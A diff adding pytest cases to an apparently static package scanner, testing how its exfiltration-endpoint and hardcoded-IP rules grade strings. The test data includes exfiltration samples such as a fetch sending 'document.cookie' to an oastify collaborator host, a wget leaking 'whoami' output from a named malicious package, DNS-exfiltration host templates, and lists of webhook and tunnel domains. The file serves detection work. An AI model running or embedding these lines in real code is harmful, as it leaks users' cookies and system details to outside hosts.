@@ -303,6 +303,88 @@ def test_a_host_outside_a_domain_list_stays_high(text: str) -> None:
     assert ("high", 5.0) in _exfil(text)
 
 
+@pytest.mark.parametrize(
+    ("text", "note"),
+    [
+        # core-js's comment, bundled into many builds (`@mnykj/alleditor`, `dh-vue-poster`)
+        (
+            "        // causes a crash (https://pastebin.com/N21QzeQA) when trying to debug it.",
+            "core-js cites in a code comment (a Safari debugger crash): not an endpoint.",
+        ),
+        # host patterns in allow and deny lists (`@pinnacleplugins/*`, `agentshield`)
+        ("`*.make.com`,`hook.integromat.com`,`*.m.pipedream.net`]", "nothing connects to"),
+        ('      "*.webhook.site",', "nothing connects to"),
+        # a disposable-mail list written as one string, with `\n` / `\t` escapes
+        (
+            "'yn.io\\nwebclub.infos.st\\nwebemail.me\\nwebhook.site\\nwebinarmoa.com\\nwebm4il.info'",
+            "A host in a list of domains, not an endpoint.",
+        ),
+        (
+            "'webhane.com\\t18\\nwebhocseo.com\\t2\\nwebhook.site\\t19\\nwebhosting.org\\t2\\n'",
+            "A host in a list of domains, not an endpoint.",
+        ),
+        ("ap.it\nap.leg.br\nap.ngrok.io\naparecida.br\n", "A host in a list of domains"),
+        ("K=`webhook.site,requestcatcher.com,ngrok.io,example.org`", "A host in a list"),
+        # an OAST host whose own label is a placeholder
+        (
+            "fetch('http://YOUR-COLLABORATOR-ID.oastify.com' + btoa(document.cookie))",
+            "A placeholder host: documentation, not an endpoint.",
+        ),
+        ('const COLLAB = "your-collab-domain.oastify.com";', "A placeholder host"),
+        ("// e.g. http://xxxxxxxxx.oastify.com", "A placeholder host"),
+        ("ping <id>.burpcollaborator.net", "A placeholder host"),
+    ],
+)
+def test_what_cannot_be_an_endpoint_is_low(text: str, note: str) -> None:
+    """v7 (round 3, X1-X4)."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
+    assert matches
+    assert {(m.severity.value, m.weight) for m in matches} == {("low", 1.0)}
+    assert all(note in m.explanation for m in matches)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "fetch('https://pastebin.com/raw/N21QzeQA')",  # read through the raw endpoint
+        "fetch('https://pastebin.com/N21QzeQAb')",  # another paste
+        "fetch('https://pastebin.com/xYz12345')",
+        "x = '**webhook.site** receives it'",  # Markdown emphasis, not a pattern
+        "dns.lookup(`94bp9h8fte9kz9v8btc6in8qnht8h85x.oastify.com`, () => {});",  # a real id
+        # a real id behind a word (`@frontend-clients/core@99.0.8`, DataDog malicious)
+        "wget http://YourServer929w1e528by00hxp38ah5mh1asgj4bs0.oastify.com/?u=$(whoami)",
+        "dns.lookup(`${hex}.oastify.com`)",  # a template: how DNS exfiltration builds hosts
+        "x = 'a.com\\nwebhook.site'",  # one other domain: not a list
+        "post('https://webhook.site/abc,https://a.com,https://b.com')",  # a URL, not an entry
+        "x = 'eu.ngrok.io\\nus.ngrok.io\\nap.ngrok.io\\nau.ngrok.io'",  # a table of endpoints
+        "x = 'webhook.site\\nmailinator.com'" + " " * 500 + "'\\na.com\\nb.com\\n'",  # too far
+        "post(`https://api.telegram.org/bot${t}/x`, ['\\na.com', '\\nb.com'])",  # kept on purpose
+    ],
+)
+def test_endpoints_v7_keeps_high(text: str) -> None:
+    assert ("high", 5.0) in _exfil(text)
+
+
+def test_example_addresses_are_low_and_more_resolvers_are_not_findings() -> None:
+    """`static.hardcoded-ip` v4 (round 3, X5)."""
+
+    def ips(text: str) -> list[tuple[str, float, str]]:
+        return [
+            (m.severity.value, m.weight, m.explanation)
+            for m in analyse(text.encode())
+            if m.rule_id == "static.hardcoded-ip"
+        ]
+
+    for text in ("placeholder: 'https://1.2.3.4:8443'", "// e.g. ws://123.45.67.89:3000/x"):
+        ((severity, weight, why),) = ips(text)
+        assert (severity, weight) == ("low", 1.0)
+        assert why.endswith("An address documentation uses as an example.")
+    for resolver in ("223.5.5.5", "223.6.6.6", "119.29.29.29", "114.114.114.114"):
+        assert ips(f"doh = 'https://{resolver}/dns-query'") == []
+    assert ips("get('http://45.33.32.156:8080/p')")[0][:2] == ("medium", 3.0)
+    assert ips("get('http://1.2.3.5/p')")[0][:2] == ("medium", 3.0)
+
+
 def test_low_matches_never_hide_a_real_one() -> None:
     """Placeholders don't count toward the rule's cap of matches."""
     text = "\n".join(["see https://example.ngrok.app"] * 5 + ["post('https://webhook.site/x')"])
